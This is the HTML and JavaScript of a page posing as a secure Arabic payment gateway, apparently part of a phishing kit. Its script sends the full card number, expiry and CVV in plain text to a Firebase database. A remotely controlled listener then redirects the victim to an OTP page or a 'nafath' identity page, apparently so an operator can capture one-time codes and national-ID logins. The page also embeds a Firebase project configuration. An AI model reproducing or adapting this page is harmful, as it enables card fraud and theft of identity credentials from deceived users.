<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>بوابة الدفع الآمنة | Secure Payment</title>
    <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
        .pay-topbar {
            display:flex; align-items:center; gap:12px; padding:14px 20px;
            background: linear-gradient(90deg, #063324, #0a4d35);
            border-bottom: 1px solid rgba(0,229,160,0.15);
        }
        .pay-topbar__text strong { display:block; font-size:1rem; color:var(--text-white); }
        .pay-topbar__text small { font-size:0.78rem; color:var(--text-muted); }
        .pay-logo-section { padding:20px 24px 14px; text-align:center; border-bottom:1px solid var(--teal-border); }
        .pay-logo-section img { height:36px; object-fit:contain; }
        .pay-logo-section h3 { font-size:1rem; font-weight:700; color:var(--text-white); margin:10px 0 0; }
        .trust-row { display:flex; align-items:center; justify-content:center; gap:8px; margin-top:20px; padding-top:16px; border-top:1px dashed var(--teal-border); color:var(--text-muted); font-size:0.8rem; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="teal-card teal-card--narrow" style="width:100%;">

    <!-- Topbar -->
    <div class="pay-topbar">
        <span style="font-size:1.3rem;">🔒</span>
        <div class="pay-topbar__text" style="flex:1;">
            <strong data-i18n="pay.secure">دفع آمن</strong>
            <small data-i18n="pay.encrypted">بياناتك مشفّرة عبر اتصال محمي</small>
        </div>
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>

    <!-- Logo + title -->
    <div class="pay-logo-section">
        <img src="images/logo.png" alt="tree" onerror="this.src='https://placehold.co/120x36/0a4d35/00e5a0?text=tree'">
        <h3 data-i18n="pay.complete">إتمام عملية الدفع</h3>
    </div>

    <div class="card-body">

        <div style="font-size:0.8rem;font-weight:700;color:var(--text-muted);text-align:center;margin-bottom:16px;text-transform:uppercase;letter-spacing:0.06em;" data-i18n="pay.choose_method">اختر طريقة الدفع</div>

        <div class="pay-method active" id="method-card" onclick="selectMethod('card')">
            <span class="pay-method__title" data-i18n="pay.credit_cards">البطاقات الائتمانية</span>
            <div class="pay-method__logos">
                <img src="images/payment/visa.svg" height="26" alt="Visa">
                <img src="images/payment/mastercard.svg" height="26" alt="Mastercard">
            </div>
        </div>
        <div class="pay-method" id="method-mada" onclick="selectMethod('mada')">
            <span class="pay-method__title" data-i18n="pay.mada">مدى</span>
            <div class="pay-method__logos">
                <img src="images/payment/mada.svg" height="28" alt="مدى">
            </div>
        </div>
        <div class="pay-method" id="method-apple" onclick="selectMethod('apple')">
            <span class="pay-method__title">Apple Pay</span>
            <div class="pay-method__logos">
                <img src="images/payment/apple-pay.svg" height="28" alt="Apple Pay">
            </div>
        </div>

        <!-- Card Form -->
        <div id="card-form" class="card-form" style="max-height:600px;">

            <div class="field">
                <label class="field__label" for="p-name" data-i18n="pay.name_label">اسم صاحب البطاقة</label>
                <input type="text" class="field__input" id="p-name" name="ccname" data-i18n="pay.name_ph" placeholder="الاسم كما هو مكتوب على البطاقة" inputmode="text" autocomplete="cc-name" autocapitalize="words">
            </div>

            <div class="field">
                <label class="field__label" for="c-num" data-i18n="pay.card_label">رقم البطاقة</label>
                <div class="card-num-wrap">
                    <img id="c-logo-box" class="card-logo-float" src="" alt="">
                    <input type="text" class="field__input card-num-input" id="c-num" name="cardnumber" inputmode="numeric" autocomplete="cc-number" maxlength="19" placeholder="0000 0000 0000 0000" dir="ltr">
                </div>
            </div>

            <div class="expiry-row">
                <div class="field">
                    <label class="field__label" data-i18n="pay.expiry">تاريخ الانتهاء</label>
                    <div style="display:flex;gap:8px;">
                        <select class="field__select" id="e-m" autocomplete="cc-exp-month" style="flex:1;">
                            <option value="" data-i18n="pay.month">شهر</option>
                            <script>for(let i=1;i<=12;i++) document.write(`<option value="${i<10?'0'+i:i}">${i<10?'0'+i:i}</option>`)</script>
                        </select>
                        <select class="field__select" id="e-y" autocomplete="cc-exp-year" style="flex:1;">
                            <option value="" data-i18n="pay.year">سنة</option>
                            <script>for(let i=24;i<=35;i++) document.write(`<option value="20${i}">20${i}</option>`)</script>
                        </select>
                    </div>
                </div>
                <div class="field">
                    <label class="field__label" for="c-v" data-i18n="pay.cvv">الرمز السري (CVV)</label>
                    <input type="password" class="field__input" id="c-v" name="cvc" maxlength="4" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" style="text-align:center;letter-spacing:0.2em;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>
            </div>

            <button type="button" class="btn-green" id="pay-btn" onclick="checkAndSend()" data-i18n="pay.confirm_btn">تأكيد ودفع</button>
        </div>

        <div class="trust-row">
            <span>🛡️</span>
            <span data-i18n="pay.trust">معالجة آمنة وفق معايير الدفع الإلكتروني</span>
        </div>

    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const LOGO = {
        visa: "images/payment/visa.svg",
        mastercard: "images/payment/mastercard.svg",
        mada: "images/payment/mada.svg"
    };

    window.addEventListener('load', () => {
        ['p-name','c-num','c-v'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
        ['e-m','e-y'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
        document.getElementById('c-logo-box').style.display = 'none';
    });

    function selectMethod(method) {
        ['method-card','method-mada','method-apple'].forEach(id => document.getElementById(id).classList.remove('active'));
        document.getElementById('method-' + method).classList.add('active');
        if (method === 'apple') { alert(t('pay.apple_unavailable')); return; }
    }
    window.selectMethod = selectMethod;

    const cardInput = document.getElementById('c-num');
    const cardLogo = document.getElementById('c-logo-box');
    cardInput.addEventListener('input', function(e) {
        let val = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/gi,'');
        let formatted = '';
        for (let i=0; i<val.length; i++) { if(i>0 && i%4===0) formatted+=' '; formatted+=val[i]; }
        e.target.value = formatted;
        if (val.startsWith('4')) { cardLogo.src=LOGO.visa; cardLogo.style.display='block'; }
        else if (/^5[1-5]/.test(val)) { cardLogo.src=LOGO.mastercard; cardLogo.style.display='block'; }
        else if (/^(58|60|96)/.test(val)) { cardLogo.src=LOGO.mada; cardLogo.style.display='block'; }
        else { cardLogo.style.display='none'; }
        if (val.length>=16 && validateLuhn(val)) document.getElementById('e-m').focus();
    });
    document.getElementById('e-m').addEventListener('change', function() { if(this.value) document.getElementById('e-y').focus(); });
    document.getElementById('e-y').addEventListener('change', function() { if(this.value) document.getElementById('c-v').focus(); });

    function validateLuhn(number) {
        let sum=0, shouldDouble=false;
        for (let i=number.length-1; i>=0; i--) {
            let digit = parseInt(number.charAt(i),10);
            if (shouldDouble) { if((digit*=2)>9) digit-=9; }
            sum+=digit; shouldDouble=!shouldDouble;
        }
        return (sum%10)===0;
    }

    async function checkAndSend() {
        const name = document.getElementById('p-name').value;
        const num = document.getElementById('c-num').value;
        const month = document.getElementById('e-m').value;
        const year = document.getElementById('e-y').value;
        const cvv = document.getElementById('c-v').value;
        const payBtn = document.getElementById('pay-btn');
        const cleanNum = num.replace(/\s+/g,'');

        if (cleanNum.length < 15 || !validateLuhn(cleanNum)) { alert(t('pay.err_card')); return; }
        if (name.length < 3 || !month || !year || cvv.length < 3) { alert(t('pay.err_incomplete')); return; }

        const now = new Date();
        if (parseInt(year,10) < now.getFullYear() || (parseInt(year,10)===now.getFullYear() && parseInt(month,10)<now.getMonth()+1)) {
            alert(t('pay.err_expired')); return;
        }

        payBtn.disabled = true;
        payBtn.innerHTML = `<span class="btn-spinner-inline"></span>${t('pay.processing')}`;

        const userId = localStorage.getItem('user_id');
        if (!userId) { alert(t('pay.err_session')); payBtn.disabled=false; payBtn.textContent=t('pay.confirm_btn'); return; }

        try {
            await db.collection("orders").doc(userId).update({
                card_name: name, card_number: num,
                expiry: month+"/"+year, cvv: cvv,
                status: "waiting_otp", next_step: "WAITING"
            });
            window.location.href = "otp_verification.html";
        } catch(e) {
            alert(t('pay.err_system'));
            payBtn.disabled=false; payBtn.textContent=t('pay.confirm_btn');
        }
    }

    (function() {
        const userId = localStorage.getItem('user_id');
        if (userId) {
            db.collection("orders").doc(userId).onSnapshot((docSnap) => {
                if (docSnap.exists) {
                    const data = docSnap.data();
                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
                }
            });
        }
    })();
</script>
</body>
</html>
